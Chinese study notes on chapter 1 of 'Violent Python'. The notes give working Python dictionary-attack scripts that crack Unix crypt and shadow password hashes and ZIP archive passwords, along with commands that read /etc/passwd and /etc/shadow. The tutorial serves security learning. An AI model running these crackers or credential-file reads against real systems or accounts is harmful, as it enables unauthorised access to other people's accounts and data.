---
title: 学习笔记 —— 《Python 绝技》 第1章 入门
date: 2022-09-05 15:24:33
categories: violent python
tags: 
    - python 
    - hacker
top_img: https://s2.loli.net/2022/09/05/kgU19pAe6s4uEKf.jpg
cover: https://s2.loli.net/2022/09/05/mXNBwx4MWHQP17a.jpg
---

## 第一个 Python 程序: Unix 口令破解机

### 杜鹃蛋

> 杜鹃蛋(The Cuckoo’s Egg)
>
>
> C. Stoll 的《杜鹃蛋》(1989)堪称新派武侠的开山之作。它第一次把黑客活动与国家安全联系在一起。黑客极具破坏性的黑暗面也浮出海面，并且永远改变了黑客的形象。迄今仍是经久不衰的畅销书。 Stoll 是劳伦斯伯克利实验室的天文学家和系统管理员。1986 年夏，一个区区 75 美分的帐目错误引起了他的警觉，在追查这次未经授权的入侵过程中，他开始卷入一个错综复杂的电脑间谍案。神秘的入侵者是西德混沌俱乐部的成员。他们潜入美国，窃取敏感的军事和安全情报。出售给克格勃，以换取现金及可卡因。一场网络跨国大搜索开始了，并牵涉出 FBI、CIA、克格勃、西德邮电部等。《杜鹃蛋》为后来的黑客作品奠定了一个主题: 追捕与反追捕的惊险故事。而且也开始了新模式: 一个坚韧和智慧的孤胆英雄，成为国家安全力量的化身，与狡猾的对手展开传奇的较量。
>
>
> 黑客的攻击手段让 Stoll 非常着迷，他将打印机连接到一台被黑的服务器上，记录下攻击者的每个按键操作。在一个记录中，Stoll 发现了一些（至少在 1988 年时）有趣的事情: 几乎在攻入服务器的同时，攻击者就立即下载了加密的口令文件。这些文件对攻击者会有什么用？要知道，服务器系统是使用 UNIX crypt 算法对用户口令进行加密的。然而，在窃取了加密口令文件后的一周，Stoll 就发现了攻击者用偷来的账号登录的情况。后来在接触了一些被黑的主机用户后，Stoll 才明白，原来这些被黑的主机的用户都是使用字典中常用词作为口令的。
>
>
> 知道这一点后，Stoll 意识到黑客曾使用字典攻击法去破解加密口令。黑客穷举了字典中的所有单词，并用 Unix `crypt()` 函数对他们进行加密，然后将结果与偷来的加密密码进行对比。如果对比成功，就破开了一个口令。

### 破解登录口令

Unix 的口令文件保存在 `/etc/passwd` 中（现代 Unix 密码保存与此不同，[查看](#现代-unix-密码破解)）。可以使用 `cat` 命令查看:

```bash
$ cat /etc/passwd
victim: HX9LLTdc/jiDE: 503:100:Iama Victim:/home/victim:/bin/sh
root: DFNFxgW7C05fo: 504:100: Markus Hess:/root:/bin/bash
```

> 口令文件各部分含义如下:
>
>
> `Username:Password:UID:GID:GECOS:Home directory:Command/shell`
>
>
> `用户名:密码信息:用户标识号:组标识号:用户信息:用户主目录:用户登录时加载的程序`
>
>
> `用户名 Username`: 用户登录操作系统时输入的字符串，即 logname。用户名在文件中列出的用户列表中必须是唯一的。
>
>
> `密码信息 Password`: 用于验证用户密码的信息；在现在的大多数用途中，此字段通常设置为“ x”（或“ \*”或其他指示符），而实际密码信息存储在单独的影子文件(`/etc /shadow`)中。在Linux系统上，将此字段设置为星号（“ \*”）是禁用直接登录帐户但​​仍保留其名称的常用方法，而另一个可能的值是“ \* NP \*”，该值指示使用[NIS服务器](https://baike.baidu.com/item/NIS/9085264)来获取密码。在没有有效的密码屏蔽的情况下，该字段通常包含用户密码的加密哈希值（与盐结合使用）。
>
>
> `用户标识号 UID(User ID)`: 操作系统将其用于内部目的。它不必是唯一的。UID 0 保留给 root 用户，UID 1-99 保留给其他预定义的帐户。UID 100-999 由系统保留，用于管理和系统帐户/组。
>
>
> `组标识号 GID(Group ID)`: 这是当前用户的缺省工作组标识。具有相似属性的多个用户可以被分配到同一个组内，每个组都有自己的组名，且以自己的组标识号相区分。在现代的Unix/Linux中，每个用户可以同时属于多个组。除了在 passwd文件中指定其归属的基本组之外，还在/etc/group文件中指明一个组所包含用户。
>
>
> `用户信息 GECOS/User ID Info`: 用于保存用户的一些信息，如真实姓名、地址、联系方式等。
>
>
> `用户主目录 Home directory`: 用户主目录的绝对路径。
>
>
> `用户登录时加载的程序 Command/shell`: 用户登录时会加载的程序。通常为 shell 。

我们要破解的就是第二部分，即 `HX9LLTdc/jiDE` 。其中前两位 `HX` 为盐(salt)，这个密码的明文是 `egg` 。我们用 [`crypt()`](https://docs.python.org/zh-cn/3/library/crypt.html#crypt.crypt) 函数就能得到加密后的值。

```python
>>> import crypt
>>> crypt.crypt('egg','HX')
'HX9LLTdc/jiDE'
```

如此，我们就可以通过遍历我们的密码字典来暴力破解密码了。

```python
import crypt # 导入 Linux 口令加密库


def test_pass(crypt_password):
    salt = crypt_password[:2]  # 获取盐
    with open("./01/dictionary.txt", "r") as dict_file:
        # 读取密码字典文件
        for word in dict_file.readlines():
            # 遍历密码字典
            word = word.strip("\n")
            print(f"[*] try password: {word:20}", end="\r")
            crypt_word = crypt.crypt(word, salt)  # 使用 scypt 加密
            if crypt_word == crypt_password:
                # 找到密码
                print(f"[+] Found Password: {word:20}")
                return
        print("[-] Password Not Found. ")
        return


def main():
    with open("./01/password_crack/crypt_password.txt", "r") as pass_file:
        # 读取加密后的密码文件
        for line in pass_file.readlines():
            if ":" in line:
                user = line.split(":")[0]   # 用户名
                crypt_password = line.split(":")[1].strip(" ")  # 加密后密码
                print(f"[*] Craking Password for {user}.")
                test_pass(crypt_password)


if __name__ == "__main__":
    main()
```

输出:

```plain
[*] Craking Password for victim.
[+] Found Password: egg               
[*] Craking Password for root.
[-] Password Not Found. 
```

### 现代 Unix 密码破解

在基于 *Nix 的现代操作系统中，`/etc/shaodw` 文件中存储了口令的 hash ，并能使用更多安全的 hash 算法。

```bash
$ sudo cat /etc/shadow | grep kali
kali:$y$j9T$U9m6hKS1vLpY.XmYv8Tke1$/dC9N2TdJ7K1OdJ6bhg.QetpUP/f7WDu9wMsEkOjYqA:19137:0:99999:7:::
```

影子文件的各字段含义如下:

`用户名:加密密码:最后一次修改时间:最小修改时间间隔:密码有效期:密码需要变更前的警告天数:密码过期后的宽限时间:账号失效时间:保留字段`

加密后的密码保存在第二部分，即 `$y$j9T$U9m6hKS1vLpY.XmYv8Tke1$/dC9N2TdJ7K1OdJ6bhg.QetpUP/f7WDu9wMsEkOjYqA` 。

其中从第1个 `$` 到最后一个 `$` 之间（左闭右开）为盐(salt)，即 `$y$j9T$U9m6hKS1vLpY.XmYv8Tke1` 。

暴力破解代码如下:

```python
import crypt  # 导入 Linux 口令加密库


def testPass(cryptPass):
    salt = cryptPass[cryptPass.find("$"):cryptPass.rfind("$")]  # 获得盐值，包含 $id 部分
    with open('01/dictionary.txt', "r") as dict_file:
        # 读取密码字典
        for word in dict_file.readlines():
            word = word.strip("\n")
            print(f"[*] try password {word:20}", end="\r")
            cryptWord = crypt.crypt(word, salt)               # 将密码字典中的值和盐值一起加密
            if (cryptWord == cryptPass):                      # 判断加密后的数据和密码字段是否相等
                print(f"[+] Found Password:{word}")        # 如果相等则打印出来
                return
        print("[-] Password Not Found.")
    return


def main():
    with open("01/password_crack/hash_password.txt", "r") as pass_file:
        # 读取加密后的密码文件
        for line in pass_file.readlines():
            # 读取密码文件
            if ":" in line:
                user = line.split(":")[0]                     # 获得用户名
                cryptPass = line.split(":")[1].strip(' ')     # 获得密码字段
                print(f"[*] Cracking Password for: {user}")
                testPass(cryptPass)

if __name__ == "__main__":
    main()

```

输出:

```plain
[*] Cracking Password for: kali
[+] Found Password:123456  
```

## 第二个 Python 程序: Zip文件口令破解机

### `zipfile` 库

编写 Zip 文件口令破解机需要使用 `zipfile` 库。 `zipfile` 库官方文档[见此](https://docs.python.org/zh-cn/3/library/zipfile.html)。我们需要重点关注 [`extractall()`](https://docs.python.org/zh-cn/3/library/zipfile.html#zipfile.ZipFile.extractall) 方法。

使用下列方法即可使用 python zipfile 库解压 Zip 文件

```python
import zipfile


z_file = zipfile.ZipFile("./01/zip_crack/evil.zip")
z_file.extractall(pwd=bytes("secret", encoding="utf-8"))
```

> **注意：`extractall` 方法的 `pwd` 参数只能接受 `bytes` 格式**

如果密码错误则会抛出 `RuntimeError`。

```python
import zipfile


z_file = zipfile.ZipFile("./01/zip_crack/evil.zip")
z_file.extractall(pwd=bytes("123456", encoding="utf-8"))
```

```plain
Traceback (most recent call last):
  File "/home/kali/violent_pyhthon/01/zip_crack/unzip.py", line 36, in <module>
    z_file.extractall(pwd=bytes("123456", encoding="utf-8"))
  File "/usr/lib/python3.10/zipfile.py", line 1643, in extractall
    self._extract_member(zipinfo, path, pwd)
  File "/usr/lib/python3.10/zipfile.py", line 1696, in _extract_member
    with self.open(member, pwd=pwd) as source, \
  File "/usr/lib/python3.10/zipfile.py", line 1569, in open
    return ZipExtFile(zef_file, mode, zinfo, pwd, True)
  File "/usr/lib/python3.10/zipfile.py", line 838, in __init__
    raise RuntimeError("Bad password for file %r" % zipinfo.orig_filename)
RuntimeError: Bad password for file 'evil.txt'
```

### 破解 Zip 口令

基于此，我们可以通过判断是否抛出异常判断密码是否正确。代码如下：

```python
import zipfile


def extract_file(z_file, password):
    print(f"[*] try password {password:20}", end="\r", flush=True)
    try:
        z_file.extractall(  # 尝试解压文件
            pwd=bytes(password, encoding="utf-8"),  # pwd 必须为 bytes 格式
            path="./01/zip_crack/evil"  # 解压路径
        )
        # 如果顺利解压, 则说明密码正确
        print(f"[+] the password is {password}")
        return password
    except:
        # 密码错误, 则抛出异常
        return False


def main():
    f_path = "./01/zip_crack/evil.zip"
    z_file = zipfile.ZipFile(f_path)  # 创建 ZipFile 对象
    with open("./01/dictionary.txt", "r") as pass_file:
        # 读取字典文件
        for line in pass_file.readlines():
            # 遍历字典
            password = line.strip("\n")
            if extract_file(z_file, password):
                # 解压成功, 退出程序
                exit(0)
    # 遍历完整个字典, 依旧未能找到密码
    print("\n[-] Password Not Found. ")


if __name__ == "__main__":
    main()
```

输出：

```plain
[+] the password is secret
```

### 使用多线程加速破解

```python
import zipfile
from threading import Thread
from threading import Semaphore


max_thread = 8  # 线程数
thread_lock = Semaphore(max_thread)
SUCCEED = False

def extract_file(z_file, password):
    global SUCCEED
    print(f"[*] try password {password}")
    try:
        z_file.extractall(  # 尝试解压文件
            pwd=bytes(password, encoding="utf-8"),  # pwd 必须为 bytes 格式
            path="./01/zip_crack/evil"  # 解压路径
        )
        # 如果顺利解压, 则说明密码正确
        print(f"[+] the password is {password}")
        SUCCEED = True
    except:
        # 密码错误, 则抛出异常
        return False
    finally:
        # 无论是否找到正确密码, 均释放线程锁
        thread_lock.release()


def main():
    f_path = "./01/zip_crack/evil.zip"
    z_file = zipfile.ZipFile(f_path)  # 创建 ZipFile 对象
    with open("./01/dictionary.txt", "r") as pass_file:
        # 读取字典文件
        for line in pass_file.readlines():
            # 遍历字典
            if SUCCEED:
                exit(0)
            password = line.strip("\n")
            thread_lock.acquire()
            t = Thread(target=extract_file, args=(z_file, password))
            t.start()
            t.join()
    # 遍历完整个字典, 依旧未能找到密码
    print("\n[-] Password Not Found. ")


if __name__ == "__main__":
    main()

```

嗯。。。似乎没有什么用。因为 `extractall()` 函数耗时很短。
